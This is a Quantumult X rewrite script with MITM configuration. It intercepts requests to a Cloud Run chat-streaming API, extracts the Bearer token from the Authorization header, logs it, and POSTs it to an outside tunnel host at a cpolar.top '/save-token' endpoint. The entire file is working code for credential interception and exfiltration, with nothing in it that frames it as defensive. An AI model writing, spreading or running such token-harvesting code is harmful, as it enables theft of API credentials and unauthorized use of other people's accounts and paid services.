/******************************
[rewrite_local]
^https?:\/\/api-v4-generatechatstream-7hb5gcrmka-uc\.a\.run\.app url script-request-header https://raw.githubusercontent.com/chiheye/qxjs/main/chatkey.js
[mitm] 
hostname = api-v4-generatechatstream-7hb5gcrmka-uc.a.run.app
********************************/

const targetURL = 'https://api-v4-generatechatstream-7hb5gcrmka-uc.a.run.app/';

if ($request && $request.url.includes(targetURL)) {
    const authorizationHeader = $request.headers['authorization'] || $request.headers['Authorization'];
    console.log('Token saved response: ' + authorizationHeader);
    
    if (authorizationHeader) {
        const bearerToken = authorizationHeader.split(' ')[1];
        
        if (bearerToken) {
            console.log(`Bearer Token: ${bearerToken}`);
            const saveTokenRequest = {
                url: 'https://4f9f562e.r6.cpolar.top/save-token',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ token: bearerToken })
            };

            $task.fetch(saveTokenRequest).then(response => {
                console.log('Token saved response: ' + response.body);
            }).catch(error => {
                console.log('Error saving token: ' + error);
            });
        } else {
            console.log("Bearer token not found in authorization header.");
        }
    } else {
        console.log("Authorization header not found.");
    }
}

$done({});
